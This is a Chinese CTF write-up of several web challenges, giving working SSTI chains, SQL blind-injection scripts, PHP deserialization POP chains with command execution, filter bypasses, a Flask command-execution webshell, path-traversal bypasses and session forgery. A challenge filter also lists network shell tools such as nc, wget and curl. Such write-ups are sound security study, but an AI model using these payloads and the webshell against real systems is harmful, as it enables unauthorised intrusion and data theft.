【5】在`{%print(().__class__.__base__.__subclasses__()[132]["__in"+"it__"].__globals__.__builtins__)%}`中发现`open`方法，随即可以通过`{%print(().__class__.__base__.__subclasses__()[132]["__in"+"it__"].__globals__.__builtins__.open("flag","r").read())%}`获取到`flag`，构造完整的POC链。

总体来看，做题的形式有点像反序列化的POP链构造，同时有多种过滤，又有相应的绕过方式。

解法不唯一，相关参考链接：

https://yyz9.cn/2020/11/26/%E4%BB%8E2020%E5%AE%89%E6%B4%B5%E6%9D%AF%E8%B5%9B%E5%90%8E%E4%BB%A5%E5%8F%8A%E8%BF%91%E6%9C%9F%E9%81%87%E5%88%B0%E7%9A%84ssti%E6%80%BB%E7%BB%93/

https://www.cnblogs.com/EddieMurphy-blogs/articles/17767089.html

https://blog.csdn.net/m0_63138919/article/details/133958661

### WEEK3-medium_sql

题型:布尔盲注 爆破

漏洞原因:sql查询语句没有过滤

题目的注入点是

```http
url/?id=TMP0919' and 1=1#
```

可以正常回显，通过`'`闭合，`#`注释后边语句，进行布尔盲注。

同时过滤了大小写。

爆破数据库名。

```sql
if(substr(database(),{n},1)=[ascii],1,0)#
```

爆破表名。

```sql
if(ascii(substr(select group_concat(table_name) from information_schema.tables where table_schema='ctf'),{n},1))={i},1,0)#
```

payload：

```python
import requests
import time

#(Select%20Count(Table_name)%20From%20Information_schema.tables%20Where%20Table_schema=Database())>3%23
#url=url+f"TMP0919%27%20And%20if(Ord(Substr(database(),2,1))>=116,1,0)%23"
#Ord(Substr(database(),2,1))>=116
#"TMP0919%27%20And%20If((SELECT%20COUNT(*)%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20'ctf')>0,1,0)%23"
#url=url+f"TMP0919%27%20And%20If((SELECT%20COUNT(*)%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27ctf%27)>0,1,0)%23"

tmp=""
n=1
i=103#127
while 1:
    print(f"结果为:{tmp}")
    url=f"http://1241d4c5-0f47-48b7-9ad4-ca252450e0ff.node4.buuoj.cn:81/?id=TMP0919'"
    payload=f"%20And%20If(Ascii(suBstr((Select%20grOup_concat(table_name)%20fRom%20infoRmation_schema.tables%20whEre%20taBle_schema%20=%20%27ctf%27),{n},1))={i},1,0)%23"
    url=url+payload
    r=requests.get(url=url)
    time.sleep(0.2)
    if 'Physics' in r.text:
        n+=1
        tmp+=chr(i)
        i=33
    i+=1

# 用于报表名可行 payload=f"%20And%20If((Ascii(Substr((Select%20Group_concat(table_name)%20from%20InfoRmation_schema.tables%20Where%20dAtabase()='ctf'%20Limit%200,1),{n},1))>{i}),1,0)%23"
#%20And%20If(Ascii(suBstr((Select%20grOup_concat(table_name)%20fRom%20infoRmation_schema.tables%20whEre%20taBle_schema%20=%20%27ctf%27),{},1))==1,1,0)%23
```

### WEEK3-R!!!C!!!E!!!!

题型:远程执行 反序列化

漏洞原因:exec()函数

题目源码：

```php+HTML
<?php
highlight_file(__FILE__);
class minipop{
    public $code;
    public $qwejaskdjnlka;
    public function __toString()
    {
        if(!preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){
            exec($this->code);
        }
        return "alright";
    }
    public function __destruct()
    {
        echo $this->qwejaskdjnlka;
    }
}
if(isset($_POST['payload'])){
    //wanna try?
    unserialize($_POST['payload']);

```

很明显的一个反序列化的链，可以构造出：

```php+HTML
<?php
highlight_file(__FILE__);

class minipop{
    public $code;
    public $qwejaskdjnlka;

    public function __construct($code,$qwejaskdjnlka)
    {
        $this->code=$code;
        $this->qwejaskdjnlka=$qwejaskdjnlka;
    }
}

$a=new minipop([command],"0");
$b=new minipop("0",$a);
echo serialize($b);
```

这里过滤了很多命令，但是在linux系统中

连接符绕过：

```
''、\、$@
```

本来想着直接使用`ls /`查看当前目录的情况的，但是貌似无法得到回显，甚至`echo "123"`都没有相应的响应。

可以尝试`ls /`然后将该命令的输出保存到特定文件内。由于`>>`被过滤了，可以使用`ls / | te''e x`，随后访问`url/x`即可。

在找到flag的名字后，如法炮制`cat flag_is_h3eeere | te''e x`。【还是对linux命令不够熟悉，该好好补一下了】

官方的WP：

```python
import time
import requests
url=
result=""
for i in range(1,15):
    for j in range(32,127):
        for k in range(32,127):
            k=chr(k)
            payload=f"if [`cat /flag_is_h3eeere | awk NR=={i} | cut -c {j}` == '{k}'];then sleep 2;fi"
```

通过一段shell脚本进行bash指令的盲注。

### WEEK3-OtenkiGirl

题型:javascript原型链污染

漏洞原因:

关于js原型链污染的相关参考链接：

https://www.yuque.com/cnily03/tech/js-prototype-pollution

按照自己的理解，js的原型链污染可以粗略的认为在一个对象A，一个对象a。对象a继承了对象A，也就是对象a等于对象A的子类继承模板。

但是可以通过`a.__proto__`来访问到`A.prototype`。也就是A给子类继承的模板。

### WEEK4-逃

题型:PHP反序列化 字符串逃逸 RCE远程执行

漏洞原因:字符串逃逸

题目:

```php+HTML
<?php
highlight_file(__FILE__);
function waf($str){
    return str_replace("bad","good",$str);
}

class GetFlag {
    public $key;
    public $cmd = "whoami";
    public function __construct($key)
    {
        $this->key = $key;
    }
    public function __destruct()
    {
        system($this->cmd);
    }
}

unserialize(waf(serialize(new GetFlag($_GET['key']))));
```

相关参考链接：

https://blog.csdn.net/giaogiao123/article/details/111318614

在PHP中序列化后的数据会以`数据类型:长度:内容;`的方式保存，而反序列化的字符串逃逸大致意思指的是在类经过序列化后，由于前一个成员变量的初始值被赋值成以`"+构造的序列化数据`结尾的字符串导致覆盖原成员变量。

覆盖的方法：`构造的成员变量1+构造的成员变量2+原成员变量2`，由于`构造的成员变量1`在经过waf替换后，长度仍为`构造的成员变量1+构造的成员变量2`的长度，因此反序列后不会报错，但 `构造的成员变量2`把属于`原成员变量2`的位置给覆盖而覆盖原始变量的初值。

题目中将`bad`替换成`good`，也就是要满足`length(bad*x+构造的成员变量2)==length(good*4)`，编写相应的脚本。

```python
cmd=str(input('[+]输入命令:'))

tmp='";s:3:"cmd";'+'s:'+str(len(cmd))+':"'+cmd+'";}'

res='bad'*len(tmp)+tmp

print(res)
```

即可实现任意命令的执行。

### WEEK4-More Fast

题型:PHP反序列化 GC垃圾回收机制

漏洞原因:

```php+HTML
 <?php
highlight_file(__FILE__);

class Start{
    public $errMsg;
    public function __destruct() {
        die($this->errMsg);
    }
}

class Pwn{
    public $obj;
    public function __invoke(){
        $this->obj->evil();
    }
    public function evil() {
        phpinfo();
    }
}

class Reverse{
    public $func;
    public function __get($var) {
        ($this->func)();
    }
}

class Web{
    public $func;
    public $var;
    public function evil() {
        if(!preg_match("/flag/i",$this->var)){
            ($this->func)($this->var);
        }else{
            echo "Not Flag";
        }
    }
}

class Crypto{
    public $obj;
    public function __toString() {
        $wel = $this->obj->good;
        return "NewStar";
    }
}

class Misc{
    public function evil() {
        echo "good job but nothing";
    }
}

$a = @unserialize($_POST['fast']);
throw new Exception("Nope"); 
```

 首先是构造POP链，在构造之前需要了解本题中的魔术方法

```php+HTML
/**
 * __toString() 当该类被当做字符串处理时触发
 * __get() 当访问该类中不存在的属性时触发
 * __invoke() 当该类被当做函数名调用时触发
 **/
```

最终是要实现`Web->evil(func,cmd)`。

```php+HTML
new Web('system','cat /fla*')
new Pwn(new Web('system','cat /fla*'))
new Reverse(new Pwn(new Web('system','cat /fla*')))
new Crypto(new Reverse(new Pwn(new Web('system','cat /fla*'))))
new Start(new Crypto(new Reverse(new Pwn(new Web('system','cat /fla*')))))
```

------

在PHP中，当只new一个对象时，会先调用`__construct()`方法，然后调用`__destruct()`方法。

而new一个对象赋值给一个变量时，先调用`__construct()`方法，在没有后续操作后才会调用`__destruct()`方法。

```php+HTML
<?php
highlight_file(__FILE__);
    class test{
        public $num;
        public function __construct($num){
            $this->num = $num;
            echo $this->num."__construct\n";
        }
 
        public function __destruct(){
            echo $this->num."__destruct\n";
        }
    }
    new test(1);
    $num1 = new test(2);
    $num2 = new test(3);
?>
```

`output：`

```php+HTML
1__construct
1__destruct
2__construct
3__construct
3__destruct
2__destruct
```

`GC垃圾回收机制`指的是当一个变量被设置为`NULL`或者没有指向该变量时（没有被调用与引用，即没有任何相关操作）会自动触发析构方法。

当在php代码中使用

```php+HTML
throw new Exception('');
```

一个`Exception()`类刚被建立就会被销毁，当做垃圾回收，因为该对象建立之后就没有任何引用。

于是这段代码就会抛出异常，导致后续的析构方法`__destruct()`方法不会被执行。

------

原题目中，由于是将反序列后的对象赋值给`$a`，也就是说只有在所有代码执行完后才会进行销毁。

```php+HTML
<?php
$a = @unserialize($_POST['fast']);
//O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:9:"cat /fla*";}}}}}
?>
```

必须要`$a`的析构方法在抛出异常之前执行。

这时候需要使用数组来进行绕过，通过将数组的某个键指向该对象，另外一个键指向为`NULL`，在经过序列化后：`a:2:{i:0;obji:1;N;}`[表示一个二元数组，键0->obj，键1->NULL]，通过修改序列化后的数据，让[键1->NULL]变成[键0->NULL]，也就是让原对象里面指向`NULL`触发GC的垃圾回收机制，立马执行析构方法进行绕过。

payload：

```php+HTML
<?php
highlight_file(__FILE__);

class Start{
    public $errMsg;
    public function __construct($errMsg) {
        $this->errMsg=$errMsg;
    }
}

class Pwn{
    public $obj;
    public function __construct($obj) {
        $this->obj=$obj;
    }
}
//  new Start(new Crypto(new Reverse(new Pwn(new Pwn()))))

class Reverse{
    public $func;
    public function __construct($func) {
        $this->func=$func;
    }
}

class Web{
    public $func;
    public $var='ls';
    public function __construct($func,$var) {
        $this->func=$func;
        $this->var=$var;
    }
}


class Crypto{
    public $obj;
    public function __construct($obj) {
        $this->obj=$obj;
    }
}

class Misc{
    public function evil() {
        echo "good job but nothing";
    }
}

$a=new Start(new Crypto(new Reverse(new Pwn(new Web('system','cat /fla*')))));
$b= array( 0 =>$a , 1 =>NULL );

echo serialize($b);

//a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:9:"cat /fla*";}}}}}i:1;N;}

//修改
//a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:9:"cat /fla*";}}}}}i:0;N;}
```

相关参考链接：

https://blog.csdn.net/weixin_44770698/article/details/129485621

### WEEK4-midsql

题型:sql时间盲注

漏洞原因:

```php
$cmd = "select name, price from items where id = ".$_REQUEST["id"];
$result = mysqli_fetch_all($result);
$result = $result[0];
```

该题过滤了空格，可用`/**/`绕过

使用二分查找能够更快的查找，通用的sql语句如下

```sql
--+查数据库的长度
if(length(database()) > {num},sleep(10),0)

--+查数据库名称
if(ascii(substr((database()),{index},1)) > {num},sleep(10),0)

--+查询表的个数
if(ascii(substr((select count(table_name) from information_schema.tables where table_schema={数据库名称}),{index},1)) > {num},sleep(10),0)

--+查询表的长度
if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema={数据库名称}),{index},1)) > {num},sleep(10),0)

--+查询字段的个数
if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name={表名称}),{index},1)) > {num},sleep(10),0)

--+查询字段的内容
if(ascii(substr((select group_concat({字段1},{字段2}) from {数据库名称}.{表名称}),{index},1)) > {num},sleep(10),0)
```

poc:

```python
import time
import requests
 
url = 'http://f6337ab6-ed3c-472d-835f-3b756a55dd5d.node4.buuoj.cn:81/?id='
 
database_name = ""
for i in range(1, 100):
    left = 32
    right = 128
    mid = (left + right) // 2
    while left < right:
        payload = url + f"1/**/and/**/if(ascii(substr((select/**/group_concat(id,name,price)/**/from/**/ctf.items),{i},1))>{mid},sleep(2),0)"
        start_time = time.time()
        response = requests.get(payload).text
        end_time = time.time()
        use_time = end_time - start_time
 
        if use_time > 2:
            left = mid + 1
        else:
            right = mid
        mid = (left + right) // 2
 
    print(mid)
    database_name += chr(mid)
    print(database_name)
```

可以将poc中的二分查找算法提取出来

```python
for i in range(1, 100):
    left = 32
    right = 128
    mid = (left + right) // 2
    while left < right:
        url = url + payload
        start_time = time.time()
        response = requests.get(url).text
        end_time = time.time()
        use_time = end_time - start_time
 
		# sleep的时间
        if use_time > 2:
            left = mid + 1
        else:
            right = mid
        mid = (left + right) // 2
```

### WEEK4-flask disk

题型:flask  无回显RCE

漏洞原因:

flask框架在开启debug的模式后，`app.py`源文件被修改后会立刻加载

```python
if __name__ == '__main__':
	app.debug = True
	app.run(host='127.0.0.1',port = 5000)
```

同时，上传文件后可以发现，上传后的文件会立刻出现在`app.py`的目录下

可以编写RCE的代码进行执行

```python
from flask import Flask,request
import os
app = Flask(__name__)

@app.route('/')
def index():    
    try:        
        cmd = request.args.get('cmd')        
        data = os.popen(cmd).read()        
        return data    
    except:        
        pass        
    return "1"
if __name__=='__main__':    
    app.run(host='0.0.0.0',port=5000,debug=True)
```

在`/`路由下传入`GET`值`cmd`可以执行任意代码并回显代码执行的后果

```http
/?cmd=cat /flag
```

官方WP中说有`Phar反序列化 gzip压缩`不知道是什么意思

### WEEK4-InjectMe

题型:flask  目录穿越任意文件访问 session伪造 SSTI模板注入

漏洞原因:

泄露路由处理的源码

```python
@app.route("/download", methods=["GET"])
def download():
    filename = request.args.get('file', '')
    if filename:
        filename = filename.replace('../', '')
        filename = os.path.join('static/img/', filename)
        print(filename)
        if (os.path.exists(filename)) and ("start" not in filename):
            return send_file(filename)
        else:
            abort(500)
    else:
        abort(404)
```

会将`../`字符串给替换成删除，可以通过构造`..././`来绕过实现`../`

同时题目给出了Dockerfile

```dockerfile
FROM vulhub/flask:1.1.1
ENV FLAG=flag{not_here}
COPY src/ /app
RUN mv /app/start.sh /start.sh && chmod 777 /start.sh
CMD [ "/start.sh" ]
EXPOSE 8080
```

可以知道项目文件部署在`/app`目录下，flag为环境变量`FLAG`

最开始是想通过文件访问`/etc/profile`、`/proc/self/environ`、`/etc/environment`来查看环境变量，但是并没有

`/etc/profile`文件内容，但没什么用

```sh
# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))
# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).

if [ "`id -u`" -eq 0 ]; then
  PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
else
  PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
fi
export PATH

if [ "${PS1-}" ]; then
  if [ "${BASH-}" ] && [ "$BASH" != "/bin/sh" ]; then
    # The file bash.bashrc already sets the default PS1.
    # PS1='\h:\w\$ '
    if [ -f /etc/bash.bashrc ]; then
      . /etc/bash.bashrc
    fi
  else
    if [ "`id -u`" -eq 0 ]; then
      PS1='# '
    else
      PS1='$ '
    fi
  fi
fi

if [ -d /etc/profile.d ]; then
  for i in /etc/profile.d/*.sh; do
    if [ -r $i ]; then
      . $i
    fi
  done
  unset i
fi
```

貌似flask项目文件一般会有`app.py`、`config.py`文件，通过`config.py`文件可以得到`session_key`：`"y0u_n3ver_k0nw_s3cret_key_1s_newst4r"`

打开网址可以看到保存的`Cookie: session="eyJ1c2VyIjoiZ3Vlc3QifQ.ZWRZ2w.g92QWQstrUg_TweFt1CuYPaHJHQ"`

而根据`app.py`路由可知

```python
@app.route('/backdoor', methods=["GET"])
def backdoor():
    try:
        print(session.get("user"))
        if session.get("user") is None:
            session['user'] = "guest"
        name = session.get("user")
        if re.findall(
                r'__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.',
                name):
            abort(500)
        else:
            return render_template_string(
                '竟然给<h1>%s</h1>你找到了我的后门，你一定是网络安全大赛冠军吧！😝 <br> 那么 现在轮到你了!<br> 最后祝您玩得愉快!😁' % name)
    except Exception:
        abort(500)
```

可以通过`name`进行SSTI的模板注入，但是必须要让`session`中的`user`可控

这时候需要通过session_key伪造session，相关参考链接：

https://github.com/noraj/flask-session-cookie-manager

加密的用法

```sh
usage: flask_session_cookie_manager{2,3}.py encode -s <secret key> -t <structure>
```

 由于给user做了黑名单过滤，需要绕过

模板注入相关参考链接：

https://www.cnblogs.com/bmjoker/p/13508538.html